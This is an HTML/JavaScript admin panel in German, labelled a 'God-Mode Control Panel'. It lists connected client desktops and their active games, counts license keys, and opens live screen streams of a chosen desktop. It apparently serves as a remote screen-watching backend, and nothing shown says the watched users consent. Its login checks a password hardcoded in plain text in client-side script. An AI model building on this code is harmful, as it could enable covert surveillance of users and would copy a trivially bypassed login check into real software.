<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASSMAR00 // GOD-MODE CONTROL PANEL</title>
    <style>
        :root {
            --accent-color: #8a2be2;
            --accent-hover: #9d3bf0;
            --accent-glow: rgba(138, 43, 226, 0.3);
            --bg-gradient: radial-gradient(circle at 50% 0%, #0d0b18 0%, #040407 100%);
            --card-bg: #090812;
            --card-border: #171429;
            --input-bg: #110f1d;
            --input-border: #221d3a;
            --text-main: #e2e2ee;
            --text-muted: #777799;
        }

        body.theme-cyan {
            --accent-color: #00f3ff;
            --accent-hover: #33f6ff;
            --accent-glow: rgba(0, 243, 255, 0.3);
            --bg-gradient: radial-gradient(circle at 50% 0%, #041820 0%, #020608 100%);
            --card-bg: #061014;
            --card-border: #0d222a;
            --input-bg: #0a1820;
            --input-border: #14303d;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        
        body { 
            background: var(--bg-gradient);
            color: var(--text-main); 
            height: 100vh; 
            overflow: hidden; 
            transition: all 0.3s ease;
        }

        #login-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(4, 4, 7, 0.96);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            backdrop-filter: blur(12px);
        }

        .login-card {
            background: var(--card-bg);
            border: 1px solid var(--accent-color);
            border-radius: 14px;
            padding: 40px;
            width: 360px;
            text-align: center;
        }

        .login-card h2 { font-size: 22px; font-weight: 800; margin-bottom: 6px; color: var(--accent-color); letter-spacing: 2px; }
        .login-card p { font-size: 11px; color: #666688; margin-bottom: 25px; text-transform: uppercase; letter-spacing: 1px; }
        .login-card .fixed-user { background: var(--input-bg); border: 1px solid var(--input-border); color: var(--text-muted); padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; font-family: monospace; }
        .login-card input { width: 100%; background: var(--input-bg); border: 1px solid var(--input-border); color: var(--accent-color); padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; outline: none; text-align: center; }
        .login-card button { width: 100%; background: var(--accent-color); color: #ffffff; border: none; padding: 12px; font-weight: bold; border-radius: 8px; cursor: pointer; text-transform: uppercase; }

        #app-container { display: none; height: 100vh; display: flex; }
        sidebar { width: 280px; background: rgba(7, 6, 12, 0.85); border-right: 1px solid var(--card-border); display: flex; flex-direction: column; padding: 22px 16px; overflow-y: auto; }
        .logo { font-size: 18px; font-weight: 900; margin-bottom: 25px; letter-spacing: 2px; text-transform: uppercase; color: var(--accent-color); padding-left: 8px; }
        .nav-category { font-size: 10px; color: #555577; text-transform: uppercase; margin: 16px 0 6px 10px; font-weight: 700; }
        .nav-btn { background: transparent; border: 1px solid transparent; color: #777799; text-align: left; padding: 10px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; margin-bottom: 4px; width: 100%; }
        .nav-btn:hover, .nav-btn.active { background: var(--input-bg); color: var(--accent-color); border-color: var(--input-border); }

        main { flex: 1; padding: 30px; overflow-y: auto; }
        header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--card-border); padding-bottom: 16px; margin-bottom: 22px; }
        h1 { font-size: 18px; font-weight: 700; text-transform: uppercase; }
        .header-controls { display: flex; gap: 12px; align-items: center; }
        .theme-selector { background: var(--input-bg); border: 1px solid var(--input-border); color: var(--text-main); padding: 6px 12px; border-radius: 8px; font-size: 12px; outline: none; cursor: pointer; }
        .status-badge { background: var(--input-bg); border: 1px solid var(--accent-color); padding: 6px 14px; border-radius: 20px; font-size: 11px; color: var(--accent-color); font-family: monospace; font-weight: bold; }

        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .grid-4 { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 16px; }

        .card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 12px; padding: 20px; margin-bottom: 16px; }
        .card h2 { font-size: 12px; color: var(--text-muted); margin-bottom: 14px; text-transform: uppercase; font-weight: 700; border-bottom: 1px solid var(--card-border); padding-bottom: 8px; }

        label { display: block; font-size: 10px; color: #666688; margin-bottom: 5px; font-weight: 700; text-transform: uppercase; }
        input, select { width: 100%; background: var(--input-bg); border: 1px solid var(--input-border); color: var(--accent-color); padding: 9px 12px; border-radius: 6px; font-size: 12px; margin-bottom: 12px; outline: none; }
        button { background: var(--accent-color); color: #ffffff; border: none; padding: 9px 16px; font-weight: bold; border-radius: 6px; cursor: pointer; font-size: 12px; }
        button:hover { background: var(--accent-hover); }

        table { width: 100%; border-collapse: collapse; margin-top: 5px; }
        th, td { text-align: left; padding: 10px; border-bottom: 1px solid var(--card-border); font-size: 11px; }
        th { color: #666688; text-transform: uppercase; font-size: 9px; }
        td { color: #aaaacc; font-family: monospace; }
        tr.user-row { cursor: pointer; }
        tr.user-row:hover { background: var(--input-bg); }

        .stats-box { background: var(--input-bg); border: 1px solid var(--input-border); border-radius: 8px; padding: 14px; text-align: center; }
        .stats-num { font-size: 22px; font-weight: bold; color: var(--accent-color); font-family: monospace; margin-top: 4px; }

        #user-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(2, 2, 5, 0.9); display: none; justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(10px); }
        .modal-card { background: var(--card-bg); border: 1px solid var(--accent-color); border-radius: 14px; width: 850px; max-height: 90vh; overflow-y: auto; padding: 25px; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--card-border); padding-bottom: 12px; margin-bottom: 18px; }
        .modal-title { font-size: 16px; font-weight: bold; color: var(--accent-color); font-family: monospace; }
        .close-modal { cursor: pointer; font-size: 18px; color: #ff5555; font-weight: bold; }
        .screen-stream-box { background: #020204; border: 1px solid var(--accent-color); border-radius: 8px; height: 380px; display: flex; flex-direction: column; justify-content: center; align-items: center; position: relative; overflow: hidden; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-card">
            <h2>ASSMAR00</h2>
            <p>Eingeschränkter Admin-Zugriff</p>
            <div class="fixed-user">👤 Assmar00</div>
            <input type="password" id="pass-input" placeholder="Passwort eingeben...">
            <button onclick="checkLogin()">Zugriff Gewähren</button>
            <div id="login-error" style="color: #ff4455; font-size: 11px; margin-top: 10px;"></div>
        </div>
    </div>

    <div id="user-modal">
        <div class="modal-card">
            <div class="modal-header">
                <div class="modal-title" id="m-user-title">SYSTEM INSPECTOR // USER</div>
                <div class="close-modal" onclick="closeUserModal()">✕</div>
            </div>

            <div class="screen-stream-box">
                <div style="position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 4px 8px; border-radius: 4px; font-family: monospace; font-size: 10px; color: var(--accent-color);">STREAM: LIVE // ACTIVE</div>
                <img id="live-video-feed" src="" alt="Warte auf Client-Stream..." style="width: 100%; height: 100%; object-fit: contain;">
            </div>

            <!-- STREAM STEUERUNG -->
            <div style="margin-top: 15px; background: var(--input-bg); border: 1px solid var(--input-border); padding: 12px; border-radius: 8px; display: flex; gap: 15px; align-items: center; justify-content: space-between;">
                <div style="display: flex; gap: 10px; align-items: center;">
                    <label style="margin:0; font-size:10px;">Auflösung:</label>
                    <select id="setting-res" onchange="updateStreamSettings()" style="width: 110px; margin-bottom: 0; padding: 4px;">
                        <option value="480p">480p SD</option>
                        <option value="720p" selected>720p HD</option>
                        <option value="1080p">1080p FHD</option>
                    </select>
                </div>

                <div style="display: flex; gap: 10px; align-items: center;">
                    <label style="margin:0; font-size:10px;">Bildrate (FPS):</label>
                    <select id="setting-fps" onchange="updateStreamSettings()" style="width: 90px; margin-bottom: 0; padding: 4px;">
                        <option value="15">15 FPS</option>
                        <option value="30" selected>30 FPS</option>
                        <option value="60">60 FPS</option>
                    </select>
                </div>
                <button onclick="updateStreamSettings()" style="padding: 5px 12px; font-size: 11px;">Übernehmen</button>
            </div>
        </div>
    </div>

    <div id="app-container">
        <sidebar>
            <div class="logo">ASSMAR00</div>
            <div class="nav-category">Steuerung</div>
            <button class="nav-btn active" onclick="switchTab('dashboard', this)">📊 Telemetrie & Übersicht</button>
            <button class="nav-btn" onclick="switchTab('users', this)">👥 Desktop-Sessions & Live</button>
        </sidebar>

        <main>
            <header>
                <h1>System Telemetrie</h1>
                <div class="header-controls">
                    <select class="theme-selector" onchange="changeTheme(this.value)">
                        <option value="purple">💜 Neon Purple</option>
                        <option value="cyan">🩵 Cyber Cyan</option>
                    </select>
                    <div class="status-badge">WILLKOMMEN, ASSMAR00</div>
                </div>
            </header>

            <div id="dashboard" class="tab-content active">
                <div class="grid-4" style="margin-bottom: 20px;">
                    <div class="stats-box"><label>Aktive Clients</label><div class="stats-num" id="stat-active-clients">0</div></div>
                    <div class="stats-box"><label>Keys Gesamt</label><div class="stats-num" id="stat-total-keys">0</div></div>
                </div>
            </div>

            <div id="users" class="tab-content">
                <div class="card">
                    <h2>Aktive Live-Sessions</h2>
                    <table>
                        <thead>
                            <tr>
                                <th>Desktop-Name</th>
                                <th>Aktives Game</th>
                                <th>Aktion</th>
                            </tr>
                        </thead>
                        <tbody id="users-table-body"></tbody>
                    </table>
                </div>
            </div>
        </main>
    </div>

    <script>
        function changeTheme(themeName) {
            document.body.className = themeName === 'cyan' ? 'theme-cyan' : '';
        }

        function checkLogin() {
            const pass = document.getElementById('pass-input').value.trim();
            if (pass === "Assmar00.550662.-?") {
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('app-container').style.display = 'flex';
                loadLiveData();
                setInterval(loadLiveData, 3000);
            } else {
                document.getElementById('login-error').innerText = "Falsches Passwort!";
            }
        }

        function switchTab(tabId, btn) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            btn.classList.add('active');
        }

        async function loadLiveData() {
            try {
                const statsRes = await fetch('/api/stats');
                const stats = await statsRes.json();
                document.getElementById('stat-active-clients').innerText = stats.active_clients;
                document.getElementById('stat-total-keys').innerText = stats.total_keys;

                const usersRes = await fetch('/api/users');
                const users = await usersRes.json();
                const tbody = document.getElementById('users-table-body');
                tbody.innerHTML = '';
                if(users.length === 0) {
                    tbody.innerHTML = `<tr><td colspan="3" style="text-align:center; color:#777;">Keine Clients online</td></tr>`;
                } else {
                    users.forEach(u => {
                        tbody.innerHTML += `
                            <tr class="user-row">
                                <td>${u.desktop}</td>
                                <td>${u.game}</td>
                                <td><button onclick='openUserModal(${JSON.stringify(u)})'>Live Inspect</button></td>
                            </tr>`;
                    });
                }
            } catch(e) {}
        }

        async function updateStreamSettings() {
            await fetch('/api/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    stream_res: document.getElementById('setting-res').value,
                    stream_fps: document.getElementById('setting-fps').value,
                    stream_quality: 65
                })
            });
        }

        function openUserModal(u) {
            document.getElementById('m-user-title').innerText = "LIVE VIEW // " + u.desktop;
            document.getElementById('live-video-feed').src = "/video_feed?user=" + encodeURIComponent(u.desktop);
            document.getElementById('user-modal').style.display = 'flex';
        }

        function closeUserModal() {
            document.getElementById('user-modal').style.display = 'none';
            document.getElementById('live-video-feed').src = "";
        }
    </script>
</body>
</html>
